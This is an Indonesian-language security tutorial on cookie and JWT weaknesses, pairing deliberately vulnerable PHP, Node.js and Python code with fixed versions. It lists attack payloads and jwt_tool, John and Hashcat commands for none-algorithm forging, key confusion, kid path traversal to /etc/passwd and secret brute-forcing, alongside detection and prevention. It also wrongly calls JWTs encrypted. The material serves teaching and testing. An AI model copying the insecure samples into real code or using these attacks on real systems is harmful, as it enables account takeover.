# Cookie dan JSON Web Token (JWT)

## Pengertian

Dalam aplikasi web modern, Cookie dan JWT (JSON Web Token) adalah dua mekanisme yang umum digunakan untuk menyimpan dan mengirimkan informasi identitas pengguna antara browser (klien) dan server. Keduanya berfungsi untuk menjaga sesi pengguna tetap aktif setelah proses autentikasi.

**Definisi:**

- **Cookie** adalah data kecil yang disimpan oleh browser dan dikirimkan secara otomatis ke server pada setiap permintaan. Cookie biasanya digunakan untuk menyimpan ID sesi atau preferensi pengguna.

- **JWT (JSON Web Token)** adalah token berbentuk string yang membawa informasi pengguna dalam format terenkripsi. JWT terdiri dari tiga bagian: header (algoritma), payload (data), dan signature (tanda tangan digital). JWT sering digunakan dalam aplikasi berbasis API sebagai metode autentikasi tanpa menyimpan sesi di server.

**Analogi:** Cookie seperti kartu anggota gym yang discan setiap kali masuk -- sistem mengenali Anda secara otomatis. JWT seperti tiket konser dengan kode barcode yang membawa informasi tentang siapa Anda dan kursi mana yang menjadi hak Anda.

## Contoh Source Code yang Rentan Kerentanan Cookie & JWT

### 1. Cookie Tanpa Flag Secure dan HttpOnly (PHP)

**Kode Rentan:**
```php
<?php
session_start();

// BAHAYA: Cookie tanpa flag Secure dan HttpOnly
setcookie("session_id", session_id(), time() + 3600, "/");

// Atau setting session tanpa konfigurasi keamanan
$_SESSION['user_id'] = $user_id;
$_SESSION['role'] = 'user';
?>
```

**Kode Aman:**
```php
<?php
// AMAN: Konfigurasi cookie dengan flag keamanan
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);

session_start();

$_SESSION['user_id'] = $user_id;
$_SESSION['role'] = 'user';
?>
```

### 2. JWT dengan Secret Key Lemah (Node.js)

**Kode Rentan:**
```javascript
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

app.post('/login', (req, res) => {
    const user = { id: 1, username: 'Kaguai', role: 'user' };
    
    // BAHAYA: Secret key terlalu lemah dan mudah ditebak
    const token = jwt.sign(user, 'secret');
    
    res.json({ token });
});

app.get('/profile', (req, res) => {
    const token = req.headers.authorization;
    try {
        // BAHAYA: Tidak ada verifikasi algoritma
        const decoded = jwt.verify(token, 'secret');
        res.json(decoded);
    } catch (err) {
        res.status(401).json({ error: 'Invalid token' });
    }
});

app.listen(3000);
```

**Kode Aman:**
```javascript
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

// AMAN: Gunakan secret key yang kuat dari environment variable
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex');
const JWT_ALGORITHM = 'HS256';

app.post('/login', (req, res) => {
    const user = { id: 1, username: 'Kaguai', role: 'user' };
    
    // AMAN: Gunakan algoritma eksplisit dan expiration time
    const token = jwt.sign(user, JWT_SECRET, {
        algorithm: JWT_ALGORITHM,
        expiresIn: '1h',
        issuer: 'myapp',
        audience: 'myapp-users'
    });
    
    res.json({ token });
});

app.get('/profile', (req, res) => {
    const token = req.headers.authorization;
    try {
        // AMAN: Verifikasi dengan algoritma eksplisit
        const decoded = jwt.verify(token, JWT_SECRET, {
            algorithms: [JWT_ALGORITHM],
            issuer: 'myapp',
            audience: 'myapp-users'
        });
        res.json(decoded);
    } catch (err) {
        res.status(401).json({ error: 'Invalid token' });
    }
});

app.listen(3000);
```

### 3. JWT Disimpan di localStorage (JavaScript)

**Kode Rentan:**
```javascript
// Login
fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ username: 'Kaguai', password: 'password123' })
})
.then(res => res.json())
.then(data => {
    // BAHAYA: Menyimpan JWT di localStorage rentan XSS
    localStorage.setItem('token', data.token);
});

// Mengirim token
fetch('/api/profile', {
    headers: {
        'Authorization': localStorage.getItem('token')
    }
});
```

**Kode Aman:**
```javascript
// Login
fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ username: 'Kaguai', password: 'password123' })
})
.then(res => res.json())
.then(data => {
    // AMAN: Server set cookie dengan flag HttpOnly dan Secure
    // Token tidak perlu disimpan di client
    window.location.href = '/dashboard';
});

// Mengirim token (otomatis via cookie)
fetch('/api/profile', {
    credentials: 'include'  // Cookie dikirim otomatis
});
```

### 4. JWT Tanpa Verifikasi Signature (Python/Flask)

**Kode Rentan:**
```python
from flask import Flask, request, jsonify
import jwt

app = Flask(__name__)
SECRET_KEY = 'secret'

@app.route('/profile')
def profile():
    token = request.headers.get('Authorization')
    try:
        # BAHAYA: Tidak memverifikasi signature (algoritma none)
        decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256', 'none'])
        return jsonify(decoded)
    except Exception as e:
        return jsonify({'error': str(e)}), 401

if __name__ == "__main__":
    app.run(debug=True)
```

**Kode Aman:**
```python
from flask import Flask, request, jsonify
import jwt

app = Flask(__name__)
SECRET_KEY = os.environ.get('SECRET_KEY', os.urandom(32).hex())

@app.route('/profile')
def profile():
    token = request.headers.get('Authorization')
    try:
        # AMAN: Hanya izinkan algoritma yang aman
        decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return jsonify(decoded)
    except jwt.ExpiredSignatureError:
        return jsonify({'error': 'Token has expired'}), 401
    except jwt.InvalidTokenError:
        return jsonify({'error': 'Invalid token'}), 401

if __name__ == "__main__":
    app.run(debug=True)
```

## Kerentanan Umum

Ketika implementasi Cookie atau JWT tidak dilakukan dengan benar, beberapa kerentanan dapat muncul:

### 1. Pencurian melalui XSS (Cross-Site Scripting)

Jika aplikasi memiliki celah XSS, penyerang dapat menyisipkan skrip berbahaya yang mencuri Cookie atau JWT pengguna lain. Token yang dicuri kemudian dapat digunakan untuk mengakses akun korban.

### 2. Pembajakan Sesi (Session Hijacking)

Cookie atau JWT yang berhasil dicuri dapat digunakan oleh penyerang untuk menyamar sebagai pengguna sah dan mengambil alih sesi login mereka.

### 3. Manipulasi Token JWT

JWT yang tidak diverifikasi dengan benar dapat dimodifikasi oleh penyerang. Misalnya, mengubah nilai `role: "user"` menjadi `role: "admin"` untuk mendapatkan hak akses lebih tinggi.

### 4. Penyimpanan yang Tidak Aman

Menyimpan JWT di localStorage browser berisiko jika aplikasi memiliki celah XSS, karena skrip jahat dapat mengakses seluruh isi localStorage dengan mudah.

### 5. Peningkatan Hak Akses (Privilege Escalation)

Penyerang dapat mengakses fitur terlarang hanya dengan mengubah nilai Cookie atau JWT, atau memanfaatkan ID yang dapat ditebak.

## Jenis Serangan

### Manipulasi Cookie
Penyerang mengubah nilai Cookie melalui alat pengembang browser untuk mencoba mengakses fitur yang seharusnya tidak tersedia bagi mereka.

### Serangan Algoritma None pada JWT
Penyerang memalsukan token JWT dengan mengubah algoritma verifikasi menjadi `none`, sehingga server tidak memverifikasi tanda tangan digital token.

**Contoh JWT dengan algoritma none:**
```
Header asli:
{"alg": "HS256", "typ": "JWT"}

Diubah menjadi:
{"alg": "none", "typ": "JWT"}

Token tidak memerlukan signature, server yang rentan akan menerima token ini.
```

### Bruteforce Secret Key
Penyerang mencoba menebak kunci rahasia (secret key) yang digunakan untuk menandatangani JWT menggunakan daftar kata umum dan alat otomatis.

**Contoh secret key lemah yang sering digunakan:**
```
secret
password
123456
key
jwt_secret
```

### IDOR melalui JWT atau Cookie
Jika JWT atau Cookie berisi ID pengguna yang dapat diubah, penyerang dapat mengganti ID tersebut untuk melihat data milik pengguna lain.

**Contoh JWT payload:**
```json
{
  "user_id": 5,
  "username": "Kaguai",
  "role": "user"
}
```

Penyerang dapat mengubah `user_id` menjadi 6 untuk mengakses data pengguna lain.

## Kumpulan Payload dan Teknik Pengujian

### Payload Manipulasi Cookie

**Mengubah nilai cookie:**
```
session_id=abc123 → session_id=admin
user_id=5 → user_id=1
role=user → role=admin
is_admin=false → is_admin=true
```

**Menggunakan browser dev tools:**
```
1. Buka Developer Tools (F12)
2. Application/Storage → Cookies
3. Edit nilai cookie
4. Refresh halaman
```

### Payload JWT None Algorithm

**Langkah eksploitasi:**
```
1. Decode JWT asli (base64)
2. Ubah header: {"alg": "none", "typ": "JWT"}
3. Hapus signature
4. Encode kembali dan kirim
```

**Menggunakan tool jwt_tool:**
```bash
python jwt_tool.py <token> -X a
```

### Payload JWT Key Confusion

**Mengubah algoritma dari RS256 ke HS256:**
```
1. Dapatkan public key dari server
2. Ubah header algoritma dari RS256 ke HS256
3. Tanda tangani token dengan public key sebagai secret
4. Server yang rentan akan memverifikasi dengan public key
```

**Menggunakan jwt_tool:**
```bash
python jwt_tool.py <token> -X k -pk public_key.pem
```

### Payload JWT Kid Manipulation

**Manipulasi header Kid (Key ID):**
```
{"alg": "HS256", "typ": "JWT", "kid": "../../etc/passwd"}

Server akan menggunakan file /etc/passwd sebagai secret key.
```

**Menggunakan jwt_tool:**
```bash
python jwt_tool.py <token> -X i -kid "../../etc/passwd"
```

## Tools untuk Pengujian Cookie & JWT

### 1. jwt_tool

jwt_tool adalah alat utama untuk pengujian keamanan JWT.

**Instalasi:**
```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip3 install -r requirements.txt
```

**Penggunaan:**
```bash
-- Decode JWT
python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

-- Menguji algoritma none
python jwt_tool.py <token> -X a

-- Menguji key confusion (RS256 ke HS256)
python jwt_tool.py <token> -X k -pk public_key.pem

-- Bruteforce secret key
python jwt_tool.py <token> -d /usr/share/wordlists/rockyou.txt

-- Manipulasi kid header
python jwt_tool.py <token> -X i -kid "../../etc/passwd"

-- Membuat token baru
python jwt_tool.py <token> -I -hc '{"alg":"HS256","typ":"JWT"}' -pc '{"user_id":1,"role":"admin"}' -S secret
```

### 2. John the Ripper

John the Ripper dapat digunakan untuk bruteforce secret key JWT.

**Instalasi:**
```bash
sudo apt install john
```

**Penggunaan:**
```bash
-- Extract hash dari JWT
python3 /usr/share/john/jwt2john.py <token> > jwt.hash

-- Bruteforce
john jwt.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### 3. Hashcat

Hashcat adalah alat bruteforce yang lebih cepat dengan dukungan GPU.

**Penggunaan:**
```bash
-- Bruteforce JWT dengan Hashcat (mode 16500)
hashcat -m 16500 jwt.hash /usr/share/wordlists/rockyou.txt
```

### 4. Burp Suite

Burp Suite dapat digunakan untuk manipulasi Cookie dan JWT:

- **Repeater** -- Memodifikasi cookie/token dan menganalisis respons
- **Intruder** -- Otomatisasi pengujian berbagai nilai
- **JSON Web Tokens** (Extension) -- Decode dan manipulasi JWT

**Extension Burp untuk JWT:**
```
1. Install "JSON Web Tokens" dari BApp Store
2. JWT akan otomatis di-decode di setiap request
3. Dapat memanipulasi payload dengan mudah
```

### 5. jwt.io

Website untuk decode dan encode JWT secara manual:
- https://jwt.io

### 6. Cookie-Editor (Browser Extension)

Extension browser untuk mengelola cookie:
- Chrome: https://chrome.google.com/webstore/detail/cookie-editor
- Firefox: https://addons.mozilla.org/firefox/addon/cookie-editor

## Metode Deteksi

Untuk mengidentifikasi kerentanan pada Cookie dan JWT:

1. **Periksa flag cookie** -- Pastikan flag Secure, HttpOnly, dan SameSite disetel
2. **Uji manipulasi cookie** -- Ubah nilai cookie dan lihat apakah aplikasi menerima perubahan
3. **Decode JWT** -- Periksa isi payload dan header
4. **Uji algoritma none** -- Ubah algoritma menjadi `none` dan kirim token tanpa signature
5. **Bruteforce secret key** -- Coba tebak secret key dengan wordlist
6. **Periksa penyimpanan** -- Pastikan JWT tidak disimpan di localStorage jika ada risiko XSS

## Metode Pencegahan

1. **Gunakan flag Secure dan HttpOnly pada Cookie** -- Flag Secure memastikan Cookie hanya dikirim melalui HTTPS. Flag HttpOnly mencegah Cookie diakses melalui JavaScript
   
   ```php
   setcookie("session", $session_id, [
       'secure' => true,
       'httponly' => true,
       'samesite' => 'Strict'
   ]);
   ```

2. **Simpan JWT dengan aman** -- Hindari menyimpan JWT di localStorage jika memungkinkan. Gunakan Cookie HttpOnly sebagai alternatif

3. **Verifikasi tanda tangan JWT di server** -- Selalu verifikasi signature JWT dan jangan percaya data dalam payload tanpa verifikasi
   
   ```python
   # Selalu verifikasi dengan algoritma eksplisit
   decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
   ```

4. **Gunakan secret key yang kuat** -- Gunakan kunci rahasia yang panjang dan acak untuk menandatangani JWT
   
   ```python
   SECRET_KEY = os.urandom(64).hex()
   ```

5. **Terapkan masa berlaku token** -- JWT harus memiliki expiration time (exp) yang wajar untuk membatasi waktu penggunaan jika token dicuri
   
   ```python
   token = jwt.encode({
       'user_id': user_id,
       'exp': datetime.utcnow() + timedelta(hours=1)
   }, SECRET_KEY)
   ```

6. **Validasi hak akses di server** -- Jangan hanya mengandalkan data dalam Cookie atau JWT. Selalu verifikasi hak akses pengguna di sisi server

7. **Gunakan claim standar** -- Gunakan claim seperti `iss` (issuer), `aud` (audience), dan `exp` (expiration) untuk validasi tambahan

## Latihan Praktis

Silakan lanjutkan ke direktori `lab-Challanges/` untuk latihan berbasis skenario.

## Referensi Lanjutan

- OWASP Session Management Cheat Sheet
- OWASP JSON Web Token Cheat Sheet
- RFC 7519: JSON Web Token (JWT)
- jwt_tool -- https://github.com/ticarpi/jwt_tool
- PortSwigger: JWT Attacks -- https://portswigger.net/web-security/jwt
- PayloadsAllTheThings JWT -- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
